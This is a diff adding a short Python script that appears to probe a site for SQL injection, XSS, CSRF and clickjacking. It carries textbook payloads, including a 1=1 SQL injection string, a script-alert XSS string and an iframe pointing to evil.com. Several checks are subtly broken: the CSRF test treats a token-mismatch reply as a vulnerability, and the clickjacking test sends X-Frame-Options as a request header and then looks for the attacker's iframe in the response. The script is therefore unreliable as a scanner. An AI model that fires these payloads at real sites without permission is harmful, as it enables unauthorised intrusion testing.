@@ -1,0 +1,31 @@
+import requests
+
+# Define the URL to test
+url = "http://example.com"
+
+# Define the payloads for each vulnerability
+sql_injection_payload = "1' or 1=1 --"
+xss_payload = "<script>alert('XSS')</script>"
+csrf_payload = "csrf_token=1234567890"
+clickjacking_payload = "<iframe src='http://evil.com'></iframe>"
+
+# Test for SQL injection
+response = requests.get(url + "/search?q=" + sql_injection_payload)
+if "Error" in response.text:
+    print("SQL injection vulnerability detected!")
+
+# Test for XSS
+response = requests.get(url + "/search?q=" + xss_payload)
+if "<script>alert('XSS')</script>" in response.text:
+    print("XSS vulnerability detected!")
+
+# Test for CSRF
+response = requests.post(url + "/submit_form", data=csrf_payload)
+if "CSRF token mismatch" in response.text:
+    print("CSRF vulnerability detected!")
+
+# Test for clickjacking
+headers = {"X-Frame-Options": "deny"}
+response = requests.get(url, headers=headers)
+if "<iframe src='http://evil.com'></iframe>" in response.text:
+    print("Clickjacking vulnerability detected!")
